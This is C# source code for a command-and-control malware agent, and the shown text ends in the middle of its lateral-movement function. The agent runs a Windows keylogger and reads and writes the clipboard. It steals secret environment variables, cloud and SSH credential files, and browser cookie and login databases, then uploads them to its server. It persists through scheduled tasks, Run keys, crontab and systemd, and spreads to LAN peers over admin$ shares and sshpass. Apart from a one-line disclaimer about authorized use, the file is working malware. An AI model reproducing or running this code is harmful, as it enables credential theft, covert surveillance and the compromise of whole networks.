// agent.cs — C2 agent, C# port (.NET 6+).
//
// Build (console app):
//   dotnet new console -o agent
//   copy agent.cs agent\Program.cs
//   dotnet build agent -o out
// Run:
//   out\agent.exe --server http://127.0.0.1:8000 --token <AGENT_TOKEN> --interval 10 --jitter 2
//   (token also accepted via the C2_TOKEN environment variable)
//
// Only use against systems you own or are authorized to test.
using System.Diagnostics;
using System.IO.Compression;
using System.Net;
using System.Runtime.InteropServices;
using System.Text;
using System.Text.Json;
using System.Text.Json.Serialization;

class Agent
{
    static readonly HttpClient Http = new HttpClient { Timeout = TimeSpan.FromSeconds(120) };
    static string Server = "";
    static string Token = "";
    static string AgentId = "";
    static int Interval = 10;
    static int Jitter = 0;
    static bool Verbose = false;
    static readonly int DefaultShellTimeout = 120; // seconds
    static string StateFile = Path.Combine(
        Environment.GetFolderPath(Environment.SpecialFolder.UserProfile), ".c2agent_cs.json");
    static readonly int KeylogDumpLimit = 8000;

    // --------------------------------------------------------- clone
    static readonly Dictionary<string, CloneWatcher> Clones = new();

    class CloneWatcher
    {
        public string Status = "starting";
        public string LastCheck = "never";
        public int Relaunches = 0;
        public string Command = "";
        public int Interval = 30;
        public CancellationTokenSource Cts = new();
        public Thread? Thread;
    }

    // --------------------------------------------------------- steal constants
    static readonly string[] StealKeywords = {
        "token", "secret", "password", "passwd", "key=", "api", "auth",
        "aws", "azure", "google", "github", "gitlab", "slack", "discord",
        "cookie", "session", "credential", "access", "proxy", "login",
    };
    static readonly string[] StealTokenFiles = {
        ".aws/credentials", ".aws/config",
        ".git-credentials", ".netrc", ".npmrc", ".pypirc",
        ".pip/pip.conf", ".config/pip/pip.conf",
        ".config/gh/hosts.yml", ".config/rclone/rclone.conf",
        ".config/gcloud/credentials.json", ".config/gcloud/access_tokens.db",
        ".docker/config.json", ".kube/config",
        ".ssh/id_rsa", ".ssh/id_ed25519", ".ssh/id_ecdsa", ".ssh/config",
        ".ssh/known_hosts", ".ssh/authorized_keys",
    };
    const long StealMaxFile = 8 * 1024 * 1024;
    static readonly string[] ChromiumProfileFiles = { "Login Data", "Cookies", "Web Data" };
    static readonly string[] FirefoxProfileFiles = { "cookies.sqlite", "logins.json", "key4.db", "cert9.db" };

    // --------------------------------------------------------- keylogger
    static readonly object keylogLock = new();
    static readonly StringBuilder keylogBuffer = new();
    static bool keylogActive = false;
    static IntPtr keylogHook = IntPtr.Zero;
    static NativeMethods.LowLevelKeyboardProc? keylogProc;

    // ------------------------------------------------------------------ DTOs
    class RegisterBody
    {
        [JsonPropertyName("agent_id")] public string? AgentId { get; set; }
        [JsonPropertyName("hostname")] public string Hostname { get; set; } = "";
        [JsonPropertyName("username")] public string Username { get; set; } = "";
        [JsonPropertyName("os")] public string OS { get; set; } = "";
        [JsonPropertyName("arch")] public string Arch { get; set; } = "";
        [JsonPropertyName("pid")] public int Pid { get; set; }
        [JsonPropertyName("ip")] public string IP { get; set; } = "";
        [JsonPropertyName("version")] public string Version { get; set; } = "";
        [JsonPropertyName("type")] public string Type { get; set; } = "";
    }

    class CheckinBody
    {
        [JsonPropertyName("agent_id")] public string AgentId { get; set; } = "";
    }

    class ResultBody
    {
        [JsonPropertyName("agent_id")] public string AgentId { get; set; } = "";
        [JsonPropertyName("task_id")] public string TaskId { get; set; } = "";
        [JsonPropertyName("output")] public string Output { get; set; } = "";
        [JsonPropertyName("exit_code")] public int ExitCode { get; set; }
        [JsonPropertyName("error")] public string Error { get; set; } = "";
    }

    class C2Task
    {
        [JsonPropertyName("task_id")] public string TaskId { get; set; } = "";
        [JsonPropertyName("type")] public string Type { get; set; } = "";
        [JsonPropertyName("args")] public Dictionary<string, string> Args { get; set; } = new();
    }

    class CheckinResponse
    {
        [JsonPropertyName("tasks")] public List<C2Task> Tasks { get; set; } = new();
    }

    // ---------------------------------------------------------------- helpers
    static void Log(string msg)
    {
        if (Verbose) Console.WriteLine("[*] " + msg);
    }

    static void LoadId()
    {
        try
        {
            using var doc = JsonDocument.Parse(File.ReadAllText(StateFile));
            if (doc.RootElement.TryGetProperty("agent_id", out var id))
                AgentId = id.GetString() ?? "";
        }
        catch { /* first run */ }
    }

    static void SaveId()
    {
        File.WriteAllText(StateFile, JsonSerializer.Serialize(new { agent_id = AgentId }));
    }

    static string LocalIp()
    {
        try
        {
            using var client = new System.Net.Sockets.UdpClient();
            client.Connect("8.8.8.8", 80);
            var ep = client.Client.LocalEndPoint?.ToString() ?? "";
            return ep.Split(':')[0];
        }
        catch { return ""; }
    }

    // --------------------------------------------------------- keylogger
    static string KeylogStart()
    {
        lock (keylogLock)
        {
            if (keylogActive) return "keylogger already running";
            if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
                return "error: keylogger only supported on Windows";
            keylogProc = KeylogCallback;
            keylogHook = NativeMethods.SetWindowsHookEx(13, keylogProc,
                NativeMethods.GetModuleHandle(Process.GetCurrentProcess().MainModule!.ModuleName), 0);
            if (keylogHook == IntPtr.Zero)
                return "error: SetWindowsHookEx failed";
            keylogActive = true;
            return "keylogger started";
        }
    }

    static string KeylogStop()
    {
        lock (keylogLock)
        {
            if (!keylogActive) return "keylogger not running";
            NativeMethods.UnhookWindowsHookEx(keylogHook);
            keylogHook = IntPtr.Zero;
            keylogActive = false;
            return "keylogger stopped";
        }
    }

    static string KeylogDump()
    {
        lock (keylogLock)
        {
            if (keylogBuffer.Length == 0) return "(no keystrokes recorded)";
            var text = keylogBuffer.ToString();
            if (text.Length > KeylogDumpLimit)
                text = "..." + text[^KeylogDumpLimit..];
            return text;
        }
    }

    static IntPtr KeylogCallback(int nCode, IntPtr wParam, IntPtr lParam)
    {
        if (nCode >= 0)
        {
            int msg = wParam.ToInt32();
            if (msg == 0x0100 || msg == 0x0104) // WM_KEYDOWN / WM_SYSKEYDOWN
            {
                var kbd = Marshal.PtrToStructure<KBDLHOOKSTRUCT>(lParam);
                int vk = (int)kbd.vkCode;
                string? name = vk switch
                {
                    0x0D => "[Enter]", 0x09 => "[Tab]", 0x1B => "[Esc]",
                    0x20 => "[Space]", 0x08 => "[BS]", 0x2E => "[Del]",
                    0x25 => "[Left]", 0x26 => "[Up]", 0x27 => "[Right]", 0x28 => "[Down]",
                    0x2D => "[Ins]", 0x23 => "[End]", 0x24 => "[Home]",
                    0x5B => "[LWin]", 0x5C => "[RWin]",
                    _ => null
                };
                if (name != null)
                {
                    lock (keylogLock) { keylogBuffer.Append(name); }
                }
                else if (vk >= 0x30 && vk <= 0x39)
                {
                    lock (keylogLock) { keylogBuffer.Append((char)vk); }
                }
                else if (vk >= 0x41 && vk <= 0x5A)
                {
                    bool shift = (NativeMethods.GetKeyState(0x10) & 0x8000) != 0;
                    bool caps = (NativeMethods.GetKeyState(0x14) & 0x01) != 0;
                    char c = (char)vk;
                    if (shift ^ caps) c = char.ToUpper(c); else c = char.ToLower(c);
                    lock (keylogLock) { keylogBuffer.Append(c); }
                }
            }
        }
        return NativeMethods.CallNextHookEx(keylogHook, nCode, wParam, lParam);
    }

    // --------------------------------------------------------- clipboard
    static (string, int) ClipboardGet()
    {
        try
        {
            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {
                var psi = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = "-command Get-Clipboard",
                    RedirectStandardOutput = true,
                    UseShellExecute = false,
                };
                using var p = Process.Start(psi)!;
                var text = p.StandardOutput.ReadToEnd();
                p.WaitForExit(5000);
                return (text.TrimEnd('\r', '\n'), 0);
            }
            else
            {
                // Linux/macOS: try xclip, xsel, pbpaste
                foreach (var cmd in new[] {
                    new[] {"xclip", "-selection", "clipboard", "-o"},
                    new[] {"xsel", "--clipboard", "--output"},
                    new[] {"pbpaste"}
                })
                {
                    try
                    {
                        var psi = new ProcessStartInfo
                        {
                            FileName = cmd[0],
                            Arguments = string.Join(" ", cmd.Skip(1)),
                            RedirectStandardOutput = true,
                            UseShellExecute = false,
                        };
                        using var p = Process.Start(psi)!;
                        var text = p.StandardOutput.ReadToEnd();
                        p.WaitForExit(5000);
                        if (p.ExitCode == 0) return (text.TrimEnd('\r', '\n'), 0);
                    }
                    catch { }
                }
                return ("error: no clipboard tool available", 1);
            }
        }
        catch (Exception e)
        {
            return ("error: " + e.Message, 1);
        }
    }

    static (string, int) ClipboardSet(string text)
    {
        try
        {
            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {
                var escaped = text.Replace("'", "''");
                var psi = new ProcessStartInfo
                {
                    FileName = "powershell.exe",
                    Arguments = $"-command Set-Clipboard -Value '{escaped}'",
                    UseShellExecute = false,
                };
                using var p = Process.Start(psi)!;
                p.WaitForExit(5000);
                return ("clipboard set", 0);
            }
            else
            {
                foreach (var cmd in new[] {
                    new[] {"xclip", "-selection", "clipboard"},
                    new[] {"xsel", "--clipboard", "--input"},
                    new[] {"pbcopy"}
                })
                {
                    try
                    {
                        var psi = new ProcessStartInfo
                        {
                            FileName = cmd[0],
                            Arguments = string.Join(" ", cmd.Skip(1)),
                            RedirectStandardInput = true,
                            UseShellExecute = false,
                        };
                        using var p = Process.Start(psi)!;
                        p.StandardInput.Write(text);
                        p.StandardInput.Close();
                        p.WaitForExit(5000);
                        if (p.ExitCode == 0) return ("clipboard set", 0);
                    }
                    catch { }
                }
                return ("error: no clipboard tool available", 1);
            }
        }
        catch (Exception e)
        {
            return ("error: " + e.Message, 1);
        }
    }

    [StructLayout(LayoutKind.Sequential)]
    struct KBDLHOOKSTRUCT
    {
        public uint vkCode;
        public uint scanCode;
        public uint flags;
        public uint time;
        public IntPtr dwExtraInfo;
    }

    static TOut PostJson<TIn, TOut>(string path, TIn body)
    {
        var json = JsonSerializer.Serialize(body);
        var content = new StringContent(json, Encoding.UTF8, "application/json");
        var resp = Http.PostAsync(Server + path, content).GetAwaiter().GetResult();
        if (resp.StatusCode == HttpStatusCode.NotFound)
            throw new InvalidOperationException("server returned 404 (unknown agent)");
        resp.EnsureSuccessStatusCode();
        var text = resp.Content.ReadAsStringAsync().GetAwaiter().GetResult();
        return JsonSerializer.Deserialize<TOut>(text)!;
    }

    // ------------------------------------------------------------- lifecycle
    static void Register()
    {
        var body = new RegisterBody
        {
            AgentId = AgentId,
            Hostname = Environment.MachineName,
            Username = Environment.UserName,
            OS = RuntimeInformation.IsOSPlatform(OSPlatform.Windows) ? "windows" : "unix",
            Arch = RuntimeInformation.OSArchitecture.ToString(),
            Pid = Environment.ProcessId,
            IP = LocalIp(),
            Version = "1.0",
            Type = "C#",
        };
        var resp = PostJson<RegisterBody, RegisterBody>("/api/register", body);
        AgentId = resp.AgentId!;
        SaveId();
        Log($"registered as {AgentId}");
    }

    static List<C2Task> Checkin()
    {
        var resp = PostJson<CheckinBody, CheckinResponse>(
            "/api/checkin", new CheckinBody { AgentId = AgentId });
        return resp.Tasks;
    }

    static void Report(C2Task t, ResultBody res)
    {
        res.AgentId = AgentId;
        res.TaskId = t.TaskId;
        try
        {
            PostJson<ResultBody, object>("/api/result", res);
        }
        catch (Exception e)
        {
            Log($"failed to report result: {e.Message}");
        }
    }

    // ------------------------------------------------------------- clone
    static string NowStr() => DateTime.UtcNow.ToString("yyyy-MM-dd HH:mm:ss");

    static (string, int) Clone(Dictionary<string, string> args)
    {
        var action = args.GetValueOrDefault("action", "start").Trim().ToLower();
        var target = args.GetValueOrDefault("target", "").Trim();
        if (string.IsNullOrEmpty(target)) target = AgentId;
        var command = args.GetValueOrDefault("command", "").Trim();
        int interval = 30;
        if (int.TryParse(args.GetValueOrDefault("interval", "30"), out var iv))
            interval = Math.Clamp(iv, 5, 3600);

        if (action == "stop")
        {
            if (!Clones.TryGetValue(target, out var entry))
                return ($"clone: no watcher for {target}", 1);
            entry.Cts.Cancel();
            entry.Thread?.Join(interval * 1000 + 5000);
            Clones.Remove(target);
            return ($"clone: watcher for {target} stopped", 0);
        }

        if (action == "status")
        {
            if (Clones.Count == 0)
                return ("clone: no watchers running", 0);
            var lines = new List<string>();
            foreach (var kv in Clones)
            {
                var w = kv.Value;
                lines.Add($"  {kv.Key}: {w.Status} | last_check {w.LastCheck} | " +
                          $"relaunched {w.Relaunches}x | cmd: {(string.IsNullOrEmpty(w.Command) ? "(none)" : w.Command)}");
            }
            return ("clone watchers:\n" + string.Join("\n", lines), 0);
        }

        // start
        if (Clones.ContainsKey(target))
            return ($"clone: watcher for {target} already running", 1);
        if (string.IsNullOrEmpty(command))
            return ("clone: 'command' (relaunch cmd) required", 1);
        var watcher = new CloneWatcher { Command = command, Interval = interval };
        watcher.Thread = new Thread(() => CloneLoop(target, command, interval, watcher)) { IsBackground = true };
        Clones[target] = watcher;
        watcher.Thread.Start();
        return ($"clone: watcher started on target {target} (every {interval}s, restart cmd: {command})", 0);
    }

    static void CloneLoop(string target, string command, int interval, CloneWatcher watcher)
    {
        while (!watcher.Cts.Token.IsCancellationRequested)
        {
            try
            {
                var url = Server + "/api/clone/status/" + target;
                var req = new HttpRequestMessage(HttpMethod.Get, url);
                var resp = Http.SendAsync(req, watcher.Cts.Token).GetAwaiter().GetResult();
                if (resp.StatusCode == HttpStatusCode.NotFound)
                {
                    watcher.Status = "unknown";
                    watcher.LastCheck = "target gone";
                }
                else if (resp.StatusCode == HttpStatusCode.OK)
                {
                    var body = resp.Content.ReadAsStringAsync().GetAwaiter().GetResult();
                    using var doc = JsonDocument.Parse(body);
                    var st = doc.RootElement.TryGetProperty("status", out var s) ? s.GetString() ?? "unknown" : "unknown";
                    watcher.Status = st;
                    watcher.LastCheck = NowStr();
                    if ((st == "dead" || st == "stale") && !string.IsNullOrEmpty(command))
                    {
                        if (watcher.Cts.Token.IsCancellationRequested) break;
                        watcher.Relaunches++;
                        try
                        {
                            var psi = new ProcessStartInfo
                            {
                                FileName = RuntimeInformation.IsOSPlatform(OSPlatform.Windows) ? "cmd.exe" : "/bin/sh",
                                Arguments = RuntimeInformation.IsOSPlatform(OSPlatform.Windows)
                                    ? $"/C {command}" : $"-c \"{command}\"",
                                UseShellExecute = false,
                                CreateNoWindow = true,
                            };
                            Process.Start(psi);
                        }
                        catch { /* best-effort */ }
                    }
                }
                else
                {
                    watcher.Status = "http " + (int)resp.StatusCode;
                    watcher.LastCheck = NowStr();
                }
            }
            catch
            {
                if (watcher.Cts.Token.IsCancellationRequested) break;
                watcher.Status = "error";
                watcher.LastCheck = NowStr();
            }
            try { Task.Delay(interval * 1000, watcher.Cts.Token).GetAwaiter().GetResult(); }
            catch (TaskCanceledException) { break; }
        }
    }

    // ------------------------------------------------------------- steal
    static bool StealSafeCopy(string src, string dstDir)
    {
        try
        {
            var fi = new FileInfo(src);
            if (!fi.Exists || fi.Length > StealMaxFile) return false;
            Directory.CreateDirectory(dstDir);
            File.Copy(src, Path.Combine(dstDir, fi.Name), true);
            return true;
        }
        catch { return false; }
    }

    static List<string> StealEnv(string work)
    {
        var lines = new List<string>();
        var env = Environment.GetEnvironmentVariables();
        foreach (System.Collections.DictionaryEntry kv in env)
        {
            var key = kv.Key?.ToString() ?? "";
            if (StealKeywords.Any(w => key.Contains(w, StringComparison.OrdinalIgnoreCase)))
                lines.Add($"{key}={kv.Value}");
        }
        if (lines.Count == 0) return new();
        lines.Sort();
        var path = Path.Combine(work, "env.txt");
        File.WriteAllText(path, string.Join("\n", lines) + "\n", Encoding.UTF8);
        return new List<string> { "env.txt" };
    }

    static List<string> StealTokens(string work)
    {
        var home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        var hits = new List<string>();
        var tokDir = Path.Combine(work, "tokens");
        foreach (var rel in StealTokenFiles)
        {
            var src = Path.Combine(home, rel.Replace('/', '\\'));
            if (StealSafeCopy(src, tokDir))
                hits.Add("tokens/" + Path.GetFileName(rel));
        }
        return hits;
    }

    static Dictionary<string, string> BrowserRoots()
    {
        var roots = new Dictionary<string, string>();
        var home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
        {
            var la = Environment.GetEnvironmentVariable("LOCALAPPDATA") ?? "";
            var appd = Environment.GetEnvironmentVariable("APPDATA") ?? "";
            foreach (var rel in new[] {
                "Google/Chrome/User Data", "Microsoft/Edge/User Data",
                "BraveSoftware/Brave-Browser/User Data", "Opera Software/Opera Stable" })
            {
                if (!string.IsNullOrEmpty(la))
                    roots[Path.Combine(la, rel)] = "chromium";
            }
            if (!string.IsNullOrEmpty(appd))
                roots[Path.Combine(appd, "Mozilla/Firefox/Profiles")] = "firefox";
        }
        else if (RuntimeInformation.IsOSPlatform(OSPlatform.OSX))
        {
            var b = Path.Combine(home, "Library", "Application Support");
            foreach (var name in new[] { "Google/Chrome", "Microsoft Edge", "BraveSoftware/Brave-Browser" })
                roots[Path.Combine(b, name)] = "chromium";
            roots[Path.Combine(b, "Firefox", "Profiles")] = "firefox";
        }
        else
        {
            foreach (var rel in new[] { "google-chrome", "chromium", "microsoft-edge", "msedge",
                                         "brave-browser", "brave", "opera" })
                roots[Path.Combine(home, ".config", rel)] = "chromium";
            roots[Path.Combine(home, ".mozilla", "firefox")] = "firefox";
        }
        return roots;
    }

    static List<string> StealBrowser(string work)
    {
        var hits = new List<string>();
        foreach (var kv in BrowserRoots())
        {
            var root = kv.Key;
            var kind = kv.Value;
            if (!Directory.Exists(root)) continue;
            var targets = kind == "firefox" ? FirefoxProfileFiles : ChromiumProfileFiles;
            try
            {
                foreach (var dirPath in Directory.GetDirectories(root, "*", SearchOption.AllDirectories))
                {
                    foreach (var fn in targets)
                    {
                        var srcFile = Path.Combine(dirPath, fn);
                        if (!File.Exists(srcFile)) continue;
                        var rel = Path.GetRelativePath(root, dirPath);
                        var dst = Path.Combine(work, "browser", kind, rel.Replace('\\', '_'));
                        if (StealSafeCopy(srcFile, dst))
                            hits.Add($"browser/{kind}/{rel.Replace('\\', '_')}/{fn}");
                    }
                }
            }
            catch { /* permission errors, etc. */ }
        }
        return hits;
    }

    static (string, int) Steal(string taskId, Dictionary<string, string> args)
    {
        var profile = (args.GetValueOrDefault("profile", "all") ?? "all").Trim().ToLower();
        if (profile is not ("all" or "env" or "tokens" or "browser")) profile = "all";
        var work = Path.Combine(Path.GetTempPath(), "c2steal_" + Environment.ProcessId);
        Directory.CreateDirectory(work);
        var manifest = new List<string>();
        try
        {
            if (profile is "all" or "env")
            {
                Log("steal: collecting env vars");
                manifest.AddRange(StealEnv(work));
            }
            if (profile is "all" or "tokens")
            {
                Log("steal: collecting token files");
                manifest.AddRange(StealTokens(work));
            }
            if (profile is "all" or "browser")
            {
                Log("steal: collecting browser dbs");
                manifest.AddRange(StealBrowser(work));
            }
            if (manifest.Count == 0)
                return ($"steal ({profile}): nothing found", 1);

            File.WriteAllText(Path.Combine(work, "manifest.txt"),
                string.Join("\n", manifest) + "\n", Encoding.UTF8);

            var archive = Path.Combine(work, "steal.zip");
            if (File.Exists(archive)) File.Delete(archive);
            ZipFile.CreateFromDirectory(work, archive, CompressionLevel.Fastest, false);
            var size = new FileInfo(archive).Length;

            using var form = new MultipartFormDataContent();
            var fileContent = new ByteArrayContent(File.ReadAllBytes(archive));
            fileContent.Headers.ContentType =
                new System.Net.Http.Headers.MediaTypeHeaderValue("application/zip");
            form.Add(fileContent, "file", "steal.zip");
            var resp = Http.PostAsync(Server + "/api/files/" + taskId, form).GetAwaiter().GetResult();
            if (resp.StatusCode != HttpStatusCode.OK)
                return ($"steal upload failed: HTTP {(int)resp.StatusCode}", 1);

            var listing = string.Join("\n", manifest);
            var output = $"stole {manifest.Count} item(s) -> steal.zip ({size} bytes)\n{listing}";
            if (output.Length > 4000)
                output = output[..2000] + "\n... [" + (output.Length - 2000 - 50) + " chars truncated] ...\n" + output[^50..];
            return (output, 0);
        }
        catch (Exception e)
        {
            return ("error: " + e.Message, 1);
        }
        finally
        {
            try { Directory.Delete(work, true); } catch { }
        }
    }

    // ------------------------------------------------------------ persistence / lateral
    static string SelfPath()
    {
        var p = Environment.ProcessPath;
        if (string.IsNullOrEmpty(p))
            p = Process.GetCurrentProcess().MainModule?.FileName;
        return string.IsNullOrEmpty(p) ? "agent" : Path.GetFullPath(p);
    }

    static string RelaunchCmd(string self)
    {
        var q = RuntimeInformation.IsOSPlatform(OSPlatform.Windows) ? "\"" : "'";
        return $"{q}{self}{q} --server {Server} --token {Token} " +
               $"--interval {Interval} --jitter {Jitter}";
    }

    static string FirstLine(string s)
    {
        if (string.IsNullOrEmpty(s)) return "";
        var t = s.Trim();
        int nl = t.IndexOfAny(new[] { '\n', '\r' });
        if (nl >= 0) t = t[..nl];
        return t.Trim();
    }

    // /bin/sh -c <command> where <command> may itself contain double quotes
    // (RunShell's -c "..." wrapper would break on those).
    static (string, int) RunShUnix(string command, int timeoutSec)
    {
        var timeout = TimeSpan.FromSeconds(Math.Clamp(timeoutSec, 1, 3600));
        try
        {
            var escaped = command.Replace("\\", "\\\\").Replace("\"", "\\\"");
            var psi = new ProcessStartInfo
            {
                FileName = "/bin/sh",
                Arguments = "-c \"" + escaped + "\"",
                RedirectStandardOutput = true,
                RedirectStandardError = true,
                UseShellExecute = false,
            };
            using var p = Process.Start(psi)!;
            var stdoutTask = p.StandardOutput.ReadToEndAsync();
            var stderrTask = p.StandardError.ReadToEndAsync();
            if (!p.WaitForExit((int)timeout.TotalMilliseconds))
            {
                try { p.Kill(entireProcessTree: true); } catch { }
                p.WaitForExit(3000);
                return ("command timed out (" + timeoutSec + "s)", 124);
            }
            var outText = stdoutTask.GetAwaiter().GetResult() + stderrTask.GetAwaiter().GetResult();
            if (outText.Length > 12000)
            {
                int headSize = 2400;
                int tailSize = 12000 - headSize - 40;
                outText = outText[..headSize] +
                    $"\n... [{outText.Length - headSize - tailSize} chars truncated] ...\n" +
                    outText[^tailSize..];
            }
            return (outText, p.ExitCode);
        }
        catch (Exception e)
        {
            return ("error: " + e.Message, 1);
        }
    }

    static (string, int) Persistence(Dictionary<string, string> args)
    {
        var self = SelfPath();
        var relaunch = RelaunchCmd(self);
        string dest = "";
        try
        {
            if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            {
                var appdata = Environment.GetEnvironmentVariable("APPDATA");
                if (string.IsNullOrEmpty(appdata)) appdata = Environment.GetEnvironmentVariable("USERPROFILE");
                if (string.IsNullOrEmpty(appdata)) appdata = ".";
                var dir = Path.Combine(appdata, "Microsoft", "Windows", "c2update");
                Directory.CreateDirectory(dir);
                dest = Path.Combine(dir, "c2agent.exe");
            }
            else
            {
                var homeDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                var dir = Path.Combine(homeDir, ".config", "c2update");
                Directory.CreateDirectory(dir);
                dest = Path.Combine(dir, Path.GetFileName(self));
            }
            File.Copy(self, dest, true);
        }
        catch (Exception e)
        {
            return ($"persistence: failed to copy self to {dest}: {e.Message}", 1);
        }
        var msg = $"persistence: copied self to {dest}";

        if (RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
        {
            var progdata = Environment.GetEnvironmentVariable("ProgramData");
            if (string.IsNullOrEmpty(progdata)) progdata = Environment.GetEnvironmentVariable("ALLUSERSPROFILE");
            if (string.IsNullOrEmpty(progdata)) progdata = @"C:\ProgramData";
            var launcherDir = Path.Combine(progdata, "c2update");
            Directory.CreateDirectory(launcherDir);
            var wrapper = Path.Combine(launcherDir, "c2relaunch.cmd");
            try
            {
                File.WriteAllText(wrapper, "@echo off\r\nstart \"\" /b " + relaunch + "\r\n");
            }
            catch (Exception e)
            {
                return ($"persistence: failed to write launcher {wrapper}: {e.Message}", 1);
            }
            msg += "\npersistence: wrote launcher " + wrapper;
            bool ok = false;
            var cmd = $"schtasks /Create /TN \"c2agent-persist\" /TR \"{wrapper}\" /SC ONLOGON /RL HIGHEST /F";
            var (sh, rc) = RunShell(cmd, 60);
            if (rc == 0) ok = true;
            else
            {
                msg += "\n  schtasks err: " + FirstLine(sh);
                var reg = $"reg add \"HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run\" /v c2agent /t REG_SZ /d \"{wrapper}\" /f";
                var (sh2, rc2) = RunShell(reg, 60);
                if (rc2 == 0) ok = true;
                else msg += "\n  reg err: " + FirstLine(sh2);
            }
            msg += ok ? "\n  launch hook registered (schtasks)" : "\n  no launch hook registered";
            return (msg, ok ? 0 : 1);
        }

        bool okCron = false, okSys = false;
        var line = $"@reboot {relaunch} # c2agent-persist";
        var cronCmd = $"(crontab -l 2>/dev/null | grep -v 'c2agent-persist'; echo \"{line}\") | crontab -";
        var (shC, rcC) = RunShUnix(cronCmd, 60);
        if (rcC == 0) okCron = true;
        else msg += "\n  crontab err: " + FirstLine(shC);
        var home = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
        var unit = Path.Combine(home, ".config", "c2update", "c2-update.service");
        try
        {
            File.WriteAllText(unit,
                "[Unit]\nDescription=c2 agent update\n\n[Service]\nType=simple\n" +
                $"ExecStart=/bin/sh -c \"{relaunch}\"\nRestart=always\n\n" +
                "[Install]\nWantedBy=default.target\n");
            var sysCmd = $"systemctl --user daemon-reload 2>&1; systemctl --user enable --now {unit} 2>&1";
            var (shS, rcS) = RunShell(sysCmd, 60);
            if (rcS == 0) okSys = true;
            else msg += "\n  systemctl err: " + FirstLine(shS);
        }
        catch
        {
            msg += "\n  systemctl err: cannot write unit " + unit;
        }
        msg += (okCron || okSys) ? "\n  launch hook registered (crontab/systemd)" : "\n  no launch hook registered";
        return (msg, (okCron || okSys) ? 0 : 1);
    }

    static string SubnetBase(string ip)
    {
        var parts = ip.Split('.');
        if (parts.Length >= 3) return parts[0] + "." + parts[1] + "." + parts[2];
        return ip;
    }

    static long IpToLong(string ip)
    {
        var parts = ip.Split('.');
        if (parts.Length != 4) return 0;
        long v = 0;
        foreach (var p in parts)
        {
            if (!int.TryParse(p, out var o) || o < 0 || o > 255) return 0;
            v = (v << 8) | (long)o;
        }
        return v;
    }

    static string LongToIp(long ip) =>
        ((ip >> 24) & 0xff) + "." + ((ip >> 16) & 0xff) + "." + ((ip >> 8) & 0xff) + "." + (ip & 0xff);

    static List<string> LanPeers(string subnet)
    {
        var me = LocalIp();
        var baseStr = "";
        if (!string.IsNullOrWhiteSpace(subnet)) baseStr = SubnetBase(subnet.Trim());
        else if (me.Split('.').Length == 4) baseStr = SubnetBase(me);
        if (string.IsNullOrEmpty(baseStr)) return new();
        var prefix = baseStr + ".";
        long own = IpToLong(me);
        var seen = new HashSet<long>();
        var list = new List<long>();

        void Check(string tok)
        {
            long ip = IpToLong(tok);
            if (ip == 0 || ip == own) return;
            if (((ip >> 24) & 0xff) == 0 || ((ip >> 24) & 0xff) >= 224) return;
            if (!tok.StartsWith(prefix, StringComparison.Ordinal)) return;
            if (seen.Add(ip)) list.Add(ip);
        }

        void Collect(string txt)
        {
            var sb = new StringBuilder();
            foreach (var c in txt)
            {
                if ((c >= '0' && c <= '9') || c == '.') sb.Append(c);
                else
                {
                    if (sb.Length > 0) { Check(sb.ToString()); sb.Clear(); }
                }
            }
            if (sb.Length > 0) Check(sb.ToString());
        }

        Collect(RunShell("arp -a", 20).Item1);
        if (!RuntimeInformation.IsOSPlatform(OSPlatform.Windows))
            Collect(RunShell("ip neigh", 20).Item1);
        list.Sort();
        if (list.Count > 30) list = list.GetRange(0, 30);
        return list.ConvertAll(LongToIp);
    }

    static string DeployWin(string host, string user, string pass, string self)
    {
        var share = $"\\\\{host}\\admin$";
        var (sh, rc) = RunShell($"net use \"{share}\" /user:{user} \"{pass}\"", 30);
        if (rc != 0) return $"failed (net use: {FirstLine(sh)})";
        var name = Path.GetFileName(self);
        var remote = $"\\\\{host}\\admin$\\{name}";
        (sh, rc) = RunShell($"copy /y \"{self}\" \"{remote}\"", 60);
        if (rc != 0)
        {
            RunShell($"net use \"{share}\" /delete /y", 20);
            return $"failed (copy: {FirstLine(sh)})";
        }
        var relaunch = $"\"c:\\windows\\{name}\" --server {Server} --token {Token} --interval {Interval} --jitter {Jitter}";
        (sh, rc) = RunShell($"schtasks /Create /S {host} /TN \"c2agent-lateral\" /TR \"{relaunch}\" /SC ONLOGON /RU {user} /RP {pass} /RL HIGHEST /F", 30);
        RunShell($"net use \"{share}\" /delete /y", 20);
        if (rc != 0) return $"deployed (file dropped; task: {FirstLine(sh)})";
        return "deployed (file dropped + scheduled c2agent-lateral)";
    }

    static string DeployUnix(string host, string user, string pass, string self)
    {
        var (sh, rc) = RunShell("command -v sshpass", 10);
        if (rc != 0) return "skipped (sshpass not installed)";
        var name = Path.GetFileName(self);
        var relaunch = $"'/tmp/{name}' --server {Server} --token {Token} --interval {Interval} --jitter {Jitter}";
        (sh, rc) = RunShell($"sshpass -p '{pass}' scp -o StrictHostKeyChecking=no -o ConnectTimeout=8 '{self}' {user}@{host}:/tmp/{name}", 60);
        if (rc != 0) return $"failed (scp: {FirstLine(sh)})";
        (sh, rc) = RunShell($"sshpass -p '{pass}' ssh -o StrictHostKeyChecking=no -o ConnectTimeout=8 {user}@{host} '{relaunch} &>/dev/null &'", 30);
        if (rc != 0) return $"deployed (file uploaded; launch: {FirstLine(sh)})";
        return "deployed (file uploaded + launched)";
    }

    static (string, int) Lateral(Dictionary<string, string> args)
    {
        var subnet = args.GetValueOrDefault("subnet", "");
        var user = args.GetValueOrDefault("user", "");
        var pass = args.GetValueOrDefault("pass", "");
        if (string.IsNullOrEmpty(user)) user = Environment.GetEnvironmentVariable("C2_LAT_USER") ?? "";
        if (string.IsNullOrEmpty(pass)) pass = Environment.GetEnvironmentVariable("C2_LAT_PASS") ?? "";
        var self = SelfPath();
        var peers = LanPeers(subnet);
        if (peers.Count == 0) return ("lateral: no LAN peers found", 1);
        var lines = new List<string> { $"lateral: {peers.Count} peer(s): {string.Join(",", peers)}" };
        int deployed = 0, failed = 0, skipped = 0;
        foreach (var host in peers)
